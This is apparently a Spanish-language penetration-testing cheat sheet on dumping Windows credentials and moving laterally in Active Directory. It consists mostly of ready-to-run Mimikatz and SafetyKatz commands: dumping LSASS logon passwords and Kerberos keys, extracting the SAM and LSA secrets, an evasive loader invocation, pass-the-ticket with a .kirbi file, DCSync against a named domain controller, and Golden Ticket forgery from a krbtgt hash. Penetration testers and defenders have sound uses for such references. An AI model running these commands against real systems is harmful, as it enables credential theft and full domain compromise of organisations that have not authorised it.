# Dumpear todos los hashes internamente

Tags: #MovimientoLateral #Windows #Server 

## Safetykatz

Herramienta basada en componentes de Mimikatz, integrada en un ejecutable de C# para facilitar determinadas operaciones de extracción y análisis de credenciales en evaluaciones de seguridad de Windows y Active Directory.

Requisitos:
- Sistema Windows compatible con la versión compilada.
- Runtime de .NET compatible con el binario.
- Privilegios elevados para funciones que acceden a material protegido, como memoria de LSASS.
- Las protecciones del sistema y el EDR pueden impedir su ejecución.

Nota: normalmente el nombre de la herramienta es SafetyKatz.

```powershell 
! Usuario local con permisos de Administrador 

# Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit

❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 

```

## Mimikatz

Herramienta para Windows que permite evaluar la exposición de credenciales y trabajar con mecanismos de autenticación de Windows, incluidos Kerberos y NTLM. Puede acceder a material sensible de credenciales dependiendo de los privilegios y las protecciones del sistema.

Requisitos:
- Sistema Windows compatible.
- Binario compilado para la arquitectura adecuada (x64 o x86).
- Privilegios elevados para determinadas funciones.
- Acceso a los recursos que se desea evaluar; protecciones como Credential Guard pueden limitar algunas operaciones.

```powershell 
# Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
❯ .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
❯ .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

	privilege::debug
	sekurlsa::logonpasswords
	skurlsa::logonpasswords /full
	sekurlsa::ekeys
	lsadump::lsa /patch
	lsadump::secrets
	lsadump::sam 
	token::elevate
	exit

```

## Mimikatz - Inyectar archivo (.Kirbi) a la sesión 
```bash 
192.168.107.175      DC01.LAINOSCP.local         LAINOSCP.local        DC01
       │                    │                         │                 │
       │                    │                         │                 └─ Hostname
       │                    │                         └─ Dominio DNS
       │                    └─ FQDN del equipo
       └─ IP

❯ net group "Domain Admins" /domain  # Mirar administradores del dominio 
❯ nltest /dclist:LAINOSCP.local 
```

```powershell 
# Si existe un ticket ya creado 'administrator.kirbi' se puede importar a la sesión 
❯ C:\Temp\mimikatz.exe "kerberos::ptt administrator.kirbi" "exit"
❯ klist   # Mirar si se importo 

#0>	Client: Administrator @ LAINOSCP.LOCAL
	Server: krbtgt/LAINOSCP.local @ LAINOSCP.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 10/10/2026 14:55:07 (local)
	End Time:   10/11/2026 0:55:07 (local)
	Renew Time: 10/17/2026 14:55:07 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 


EJEMPLO: DCSync
❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:<Dominio DNS> /dc:<FQDN del equipo> /user:<NetBIOS>\administrator" "exit" 

# Hacer un DCSync 
❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:LAINOSCP.local /dc:DC01.LAINOSCP.local /user:lainoscp\administrator" "exit"   
```

## Golden Ticket 
```powershell 
❯ .\mimikatz.exe          # Ejecutar Mimikatz 

	privilege::debug      
	lsadump::lsa /patch   # Dumpear los hashes (krbtgt)
	kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 # Importar el ticket 
	misc::cmd # Ejecutar una shell con el ticket importado 
```